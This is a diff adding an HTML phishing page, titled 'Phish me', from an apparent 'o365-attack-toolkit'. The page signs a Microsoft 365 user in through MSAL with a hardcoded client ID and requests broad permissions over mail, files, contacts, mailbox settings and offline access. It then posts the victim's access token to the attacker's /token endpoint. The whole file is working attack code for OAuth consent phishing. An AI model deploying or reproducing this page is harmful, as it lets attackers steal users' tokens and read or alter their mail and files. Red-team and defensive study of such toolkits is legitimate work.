@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Phish me</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/bluebird/3.3.4/bluebird.min.js"></script>
+    <script src="https://secure.aadcdn.microsoftonline-p.com/lib/1.0.0/js/msal.js"></script>
+    <script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
+</head>
+
+<body style="font-family: sans-serif;">
+<h2>Welcome to o365-attack-toolkit</h2><br />
+<h4 id="WelcomeMessage"></h4>
+<button id="SignIn" onclick="signIn()">Sign In</button><br /><br />
+
+
+<script>
+    var msalConfig = {
+        auth: {
+            clientId: "035da677-152b-4a06-a66d-2a5e749b3c69"
+        },
+        cache: {
+            cacheLocation: "localStorage",
+            storeAuthStateInCookie: true
+        }
+    };
+
+    var applicationConfig = {
+        scopes: ["offline_access","contacts.read","user.read","mail.read","notes.read.all","mailboxsettings.readwrite","Files.ReadWrite.All"]
+    }
+
+    var myMSALObj = new Msal.UserAgentApplication(msalConfig);
+
+
+    function signIn(){
+
+        myMSALObj.loginPopup(applicationConfig).then(function (loginResponse) {
+            acquireTokenPopup();
+        }).catch(function (error) {
+            console.log(error);
+        });
+    }
+    function acquireTokenPopup() {
+
+        myMSALObj.acquireTokenSilent(applicationConfig).then(function (tokenResponse) {
+            sendAccessToken(tokenResponse.accessToken);
+        }).catch(function (error) {
+            console.log(error);
+
+
+            if (requiresInteraction(error.errorCode)) {
+                myMSALObj.acquireTokenPopup(applicationConfig).then(function (tokenResponse) {
+                    sendAccessToken(tokenResponse.accessToken);
+                }).catch(function (error) {
+                    console.log(error);
+                });
+            }
+        });
+    }
+
+    function sendAccessToken(token){
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', '/token', true);
+        xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+        xhr.onload = function () {
+            console.log(this.responseText);
+        };
+        xhr.send('token='+token);
+    }
+
+</script>
+</body>
+</html>
